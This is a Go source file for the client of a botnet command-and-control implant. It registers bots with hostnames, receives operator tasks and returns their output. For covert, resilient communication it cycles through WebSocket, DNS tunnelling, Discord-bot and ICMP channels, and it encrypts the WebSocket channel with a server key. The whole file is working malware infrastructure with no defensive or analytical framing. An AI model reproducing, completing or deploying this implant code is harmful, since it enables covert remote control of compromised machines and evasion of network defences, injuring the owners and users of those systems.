package c2

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"sync"
	"time"
)

type MessageType string

const (
	MsgRegister MessageType = "register"
	MsgTask     MessageType = "task"
	MsgResult   MessageType = "result"
	MsgPing     MessageType = "ping"
	MsgPong     MessageType = "pong"
	MsgPayload  MessageType = "payload"
	MsgUpdate   MessageType = "update"
)

type Message struct {
	Type     MessageType     `json:"t"`
	ID       string          `json:"id"`
	BotID    string          `json:"bid"`
	TaskID   string          `json:"tid,omitempty"`
	Hostname string          `json:"hostname,omitempty"`
	Act      string          `json:"act,omitempty"`
	Args     json.RawMessage `json:"args,omitempty"`
	OK       *bool           `json:"ok,omitempty"`
	Output   string          `json:"out,omitempty"`
	ErrMsg   string          `json:"err,omitempty"`
	Payload  json.RawMessage `json:"p,omitempty"`
	Time     int64           `json:"ts"`
}

type Task struct {
	ID      string          `json:"id"`
	Action  string          `json:"act"`
	Args    json.RawMessage `json:"args,omitempty"`
	Timeout int             `json:"to,omitempty"`
}

type TaskResult struct {
	TaskID  string `json:"tid"`
	Success bool   `json:"ok"`
	Output  string `json:"out,omitempty"`
	Error   string `json:"err,omitempty"`
}

type C2Client struct {
	mu          sync.RWMutex
	botID       string
	serverKey   []byte
	authKey     []byte
	c2Key       string
	wsEndpoint  string
	dnsDomain   string
	discordTok  string
	discordChan string
	icmpTarget  string

	layers      []TransportLayer
	activeLayer int
	done        chan struct{}

	taskCh   chan Task
	resultCh chan TaskResult

	lastPong time.Time
}

type TransportLayer interface {
	Name() string
	Connect() error
	Send(msg *Message) error
	Receive() (*Message, error)
	Close() error
	IsConnected() bool
}

func NewC2Client(botID, wsEndpoint, dnsDomain, discordTok, discordChan, icmpTarget string) *C2Client {
	return &C2Client{
		botID:       botID,
		wsEndpoint:  wsEndpoint,
		dnsDomain:   dnsDomain,
		discordTok:  discordTok,
		discordChan: discordChan,
		icmpTarget:  icmpTarget,
		done:        make(chan struct{}),
		taskCh:      make(chan Task, 64),
		resultCh:    make(chan TaskResult, 64),
	}
}

// SetServerKey enables E2E encryption of the WebSocket channel with the c2d
// static X25519 public key (hex). SetAuthSecret optionally binds the implant
// to an operator secret; both must be configured before Start.
func (c *C2Client) SetServerKey(pubHex string) error {
	raw, err := hex.DecodeString(pubHex)
	if err != nil || len(raw) != 32 {
		return fmt.Errorf("server key must be 32 bytes of hex")
	}
	c.serverKey = raw
	return nil
}

func (c *C2Client) SetAuthSecret(secretHex string) error {
	raw, err := hex.DecodeString(secretHex)
	if err != nil || len(raw) == 0 {
		return fmt.Errorf("auth secret must be hex")
	}
	c.authKey = raw
	return nil
}

func (c *C2Client) Start() {
	c.initializeLayers()
	go c.connectLoop()
	go c.receiveLoop()
}

func (c *C2Client) Stop() {
	close(c.done)
}

func (c *C2Client) Tasks() <-chan Task {
	return c.taskCh
}

func (c *C2Client) SendResult(r TaskResult) {
	select {
	case c.resultCh <- r:
	default:
	}
}

func (c *C2Client) initializeLayers() {
	ws := NewWebSocketLayer(c.botID, c.wsEndpoint)
	if len(c.serverKey) > 0 {
		ws.SetServerKey(c.serverKey, c.authKey)
	}
	c.layers = []TransportLayer{
		ws,
		NewDNSLayer(c.botID, c.dnsDomain),
		NewDiscordLayer(c.botID, c.discordTok, c.discordChan),
		NewICMPLayer(c.botID, c.icmpTarget),
	}
	c.activeLayer = 0
}

func (c *C2Client) connectLoop() {
	backoff := 5 * time.Second

	for {
		select {
		case <-c.done:
			return
		default:
		}

		layer := c.layers[c.activeLayer]
		log.Printf("[c2] attempting layer %d (%s)", c.activeLayer, layer.Name())

		if err := layer.Connect(); err != nil {
			log.Printf("[c2] layer %d connect error: %v", c.activeLayer, err)
			c.cycleLayer()
			time.Sleep(backoff)
			backoff = minDuration(backoff*2, 60*time.Second)
			continue
		}

		backoff = 5 * time.Second

		// Send registration (flat format: the server reads msg["hostname"])
		regMsg := &Message{
			Type:     MsgRegister,
			ID:       fmt.Sprintf("reg-%d", time.Now().UnixNano()),
			BotID:    c.botID,
			Hostname: getHostname(),
			Time:     time.Now().UnixMilli(),
		}
		if err := layer.Send(regMsg); err != nil {
			log.Printf("[c2] register send error: %v", err)
			layer.Close()
			c.cycleLayer()
			continue
		}

		// Start result flush loop
		go c.flushResults(layer)

		// Wait for disconnection
		c.waitForLayer(layer)
	}
}

func (c *C2Client) waitForLayer(layer TransportLayer) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.done:
			return
		case <-ticker.C:
			if !layer.IsConnected() {
				log.Printf("[c2] layer %s disconnected", layer.Name())
				layer.Close()
				c.cycleLayer()
				return
			}
			// Send keepalive ping
			ping := &Message{
				Type:  MsgPing,
				ID:    fmt.Sprintf("ping-%d", time.Now().UnixNano()),
				BotID: c.botID,
				Time:  time.Now().UnixMilli(),
			}
			layer.Send(ping)
		}
	}
}

func (c *C2Client) receiveLoop() {
	for {
		select {
		case <-c.done:
			return
		default:
		}

		layer := c.layers[c.activeLayer]
		if !layer.IsConnected() {
			time.Sleep(1 * time.Second)
			continue
		}

		msg, err := layer.Receive()
		if err != nil {
			continue
		}

		switch msg.Type {
		case MsgTask:
			var task Task
			parsed := false
			if len(msg.Payload) > 0 {
				parsed = json.Unmarshal(msg.Payload, &task) == nil
			}
			if !parsed && msg.Act != "" {
				// flat frame: {"t":"task","id":...,"act":...,"args":...}
				task = Task{ID: msg.ID, Action: msg.Act, Args: msg.Args}
				parsed = true
			}
			if parsed {
				select {
				case c.taskCh <- task:
				default:
				}
			}
		case MsgPong:
			c.lastPong = time.Now()
		}
	}
}

func (c *C2Client) flushResults(layer TransportLayer) {
	for {
		select {
		case <-c.done:
			return
		case result := <-c.resultCh:
			ok := result.Success
			msg := &Message{
				Type:   MsgResult,
				ID:     result.TaskID,
				TaskID: result.TaskID,
				BotID:  c.botID,
				OK:     &ok,
				Output: result.Output,
				ErrMsg: result.Error,
				Time:   time.Now().UnixMilli(),
			}
			layer.Send(msg)
		}
	}
}

func (c *C2Client) cycleLayer() {
	c.activeLayer = (c.activeLayer + 1) % len(c.layers)
	log.Printf("[c2] cycling to layer %d (%s)", c.activeLayer, c.layers[c.activeLayer].Name())
}

func (c *C2Client) ActiveLayer() int {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.activeLayer
}

func (c *C2Client) BotID() string {
	return c.botID
}

func getHostname() string {
	if h, err := os.Hostname(); err == nil && h != "" {
		return h
	}
	return "unknown"
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}
